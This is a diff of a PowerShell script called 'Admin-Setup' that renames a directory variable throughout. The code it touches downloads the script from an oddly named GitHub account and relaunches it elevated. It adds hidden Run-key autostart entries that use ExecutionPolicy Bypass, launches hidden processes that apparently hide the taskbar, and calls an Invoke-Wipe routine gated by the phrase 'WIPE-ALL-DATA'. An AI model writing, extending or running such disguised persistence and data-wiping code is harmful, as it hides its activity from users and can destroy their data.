@@ -13,7 +13,7 @@ Set-StrictMode -Version 1
 $ErrorActionPreference = 'Continue'
 $ProgressPreference = 'SilentlyContinue'
 try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
-$script:Home = Join-Path $env:USERPROFILE 'admin'
+$script:AdminDir = Join-Path $env:USERPROFILE 'admin'
 $script:Url = 'https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Admin-Setup.ps1'
 $script:Live = ($ConfirmPhrase -eq 'WIPE-ALL-DATA')
 function Test-Admin {
@@ -27,9 +27,9 @@ function Get-Self {
   return $null
 }
 function L([string]$m) {
-  New-Item -ItemType Directory -Force -Path $script:Home | Out-Null
+  New-Item -ItemType Directory -Force -Path $script:AdminDir | Out-Null
   $line = '{0:yyyy-MM-dd HH:mm:ss} {1}' -f (Get-Date), $m
-  Add-Content (Join-Path $script:Home 'Admin-Setup.log') $line
+  Add-Content (Join-Path $script:AdminDir 'Admin-Setup.log') $line
   Write-Host $line
 }
 function Kill-Item([string]$Path) {
@@ -159,8 +159,8 @@ if ($Mode -eq 'Badges') { Start-Badges; return }
 if (-not (Test-Admin)) {
   $self = Get-Self
   if (-not $self) {
-    New-Item -ItemType Directory -Force -Path $script:Home | Out-Null
-    $self = Join-Path $script:Home 'Admin-Setup.ps1'
+    New-Item -ItemType Directory -Force -Path $script:AdminDir | Out-Null
+    $self = Join-Path $script:AdminDir 'Admin-Setup.ps1'
     Invoke-WebRequest -UseBasicParsing -Uri $script:Url -OutFile $self
   }
   $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$self`" -Mode $Mode"
@@ -169,17 +169,17 @@ if (-not (Test-Admin)) {
   return
 }
 
-New-Item -ItemType Directory -Force -Path $script:Home | Out-Null
+New-Item -ItemType Directory -Force -Path $script:AdminDir | Out-Null
 $ps = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
 $self = Get-Self
-if ($self) { Copy-Item $self (Join-Path $script:Home 'Admin-Setup.ps1') -Force -ErrorAction SilentlyContinue }
+if ($self) { Copy-Item $self (Join-Path $script:AdminDir 'Admin-Setup.ps1') -Force -ErrorAction SilentlyContinue }
 $run = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
 New-Item $run -Force | Out-Null
-New-ItemProperty $run -Name AdminSetupHideTaskbar -Value "`"$ps`" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($script:Home)\Admin-Setup.ps1`" -Mode HideBar" -Force | Out-Null
-New-ItemProperty $run -Name AdminSetupFolderLogo -Value "`"$ps`" -STA -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($script:Home)\Admin-Setup.ps1`" -Mode Badges" -Force | Out-Null
-Start-Process $ps -WindowStyle Hidden -ArgumentList @('-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',(Join-Path $script:Home 'Admin-Setup.ps1'),'-Mode','HideBar') | Out-Null
-Start-Process $ps -WindowStyle Hidden -ArgumentList @('-STA','-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',(Join-Path $script:Home 'Admin-Setup.ps1'),'-Mode','Badges') | Out-Null
+New-ItemProperty $run -Name AdminSetupHideTaskbar -Value "`"$ps`" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($script:AdminDir)\Admin-Setup.ps1`" -Mode HideBar" -Force | Out-Null
+New-ItemProperty $run -Name AdminSetupFolderLogo -Value "`"$ps`" -STA -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($script:AdminDir)\Admin-Setup.ps1`" -Mode Badges" -Force | Out-Null
+Start-Process $ps -WindowStyle Hidden -ArgumentList @('-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',(Join-Path $script:AdminDir 'Admin-Setup.ps1'),'-Mode','HideBar') | Out-Null
+Start-Process $ps -WindowStyle Hidden -ArgumentList @('-STA','-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',(Join-Path $script:AdminDir 'Admin-Setup.ps1'),'-Mode','Badges') | Out-Null
 
 if ($Mode -eq 'Wipe' -or $Mode -eq 'All') { Invoke-Wipe }
 L 'DONE'
-try { Start-Process notepad.exe (Join-Path $script:Home 'Admin-Setup.log') } catch {}
+try { Start-Process notepad.exe (Join-Path $script:AdminDir 'Admin-Setup.log') } catch {}
